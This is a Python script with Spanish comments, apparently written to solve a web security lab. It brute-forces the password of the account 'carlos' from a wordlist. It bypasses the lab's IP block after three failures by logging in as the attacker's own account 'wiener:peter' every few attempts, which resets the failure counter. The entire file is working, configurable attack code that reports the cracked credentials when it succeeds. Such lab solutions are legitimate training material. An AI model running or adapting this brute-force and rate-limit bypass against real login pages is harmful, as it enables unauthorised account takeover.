#!/usr/bin/env python3
"""
Brute-force con bypass de IP-block intercalando logins exitosos del atacante.

El lab bloquea la IP tras 3 fallos consecutivos. La falla logica: un login
exitoso resetea ese contador. El script alterna intentos contra `carlos:<pwd>`
con logins reales `wiener:peter` cada N intentos, manteniendo el contador
siempre por debajo del threshold.

Uso:
    python3 bruteforce.py <lab-host> <passwords-file>
        [--target carlos] [--attacker wiener] [--attacker-pwd peter]
        [--reset-every 2]   # un wiener:peter cada N intentos a carlos
"""
import argparse
import sys
import time
from urllib.parse import urlencode

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


BLOCKED_MARKER = "You have made too many incorrect login attempts"
INVALID_MARKER = "Invalid username or password"


def make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 ip-block-bypass",
    })
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[502, 503])
    s.mount("https://", HTTPAdapter(max_retries=retry))
    return s


def attempt(session, host, user, pwd):
    body = urlencode({"username": user, "password": pwd})
    r = session.post(f"https://{host}/login", data=body, timeout=30, allow_redirects=False)
    location = r.headers.get("Location", "")
    success = r.status_code == 302 and "/my-account" in location
    blocked = BLOCKED_MARKER in r.text
    return r.status_code, success, blocked, location


def reset_counter(session, host, attacker, attacker_pwd):
    status, success, blocked, _ = attempt(session, host, attacker, attacker_pwd)
    if blocked:
        print(f"[!] reset BLOCKED: la IP esta lockeada incluso para {attacker}", file=sys.stderr)
        return False
    if not success:
        print(f"[!] reset FAIL: {attacker}:{attacker_pwd} no devolvio 302 (status={status})", file=sys.stderr)
        return False
    return True


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("passwords_file")
    p.add_argument("--target", default="carlos")
    p.add_argument("--attacker", default="wiener")
    p.add_argument("--attacker-pwd", default="peter")
    p.add_argument("--reset-every", type=int, default=2,
                   help="hacer un login del atacante cada N intentos a la victima")
    p.add_argument("--delay", type=float, default=0.0, help="seg entre requests (debug)")
    args = p.parse_args()

    with open(args.passwords_file) as f:
        passwords = [line.strip() for line in f if line.strip()]

    session = make_session()
    print(f"[*] target={args.target}  attacker={args.attacker}:{args.attacker_pwd}", file=sys.stderr)
    print(f"[*] passwords={len(passwords)}  reset-every={args.reset_every}", file=sys.stderr)

    if not reset_counter(session, args.host, args.attacker, args.attacker_pwd):
        print("[!] no pude hacer login inicial como atacante; abortando", file=sys.stderr)
        return 1
    print(f"[+] login inicial OK como {args.attacker} (contador en 0)", file=sys.stderr)

    consecutive = 0
    for i, pwd in enumerate(passwords, start=1):
        if consecutive >= args.reset_every:
            if not reset_counter(session, args.host, args.attacker, args.attacker_pwd):
                return 1
            consecutive = 0

        status, success, blocked, location = attempt(session, args.host, args.target, pwd)
        consecutive += 1

        if blocked:
            print(f"[!] BLOCKED en intento #{i} pwd={pwd!r}; reduce --reset-every", file=sys.stderr)
            return 1

        if success:
            print(f"\n[+] credenciales: {args.target}:{pwd}")
            print(f"[+] Location: {location}", file=sys.stderr)
            return 0

        if i % 10 == 0:
            print(f"[*] {i}/{len(passwords)} intentado, sigue sin acertar", file=sys.stderr)

        if args.delay:
            time.sleep(args.delay)

    print("[!] wordlist agotada sin exito", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
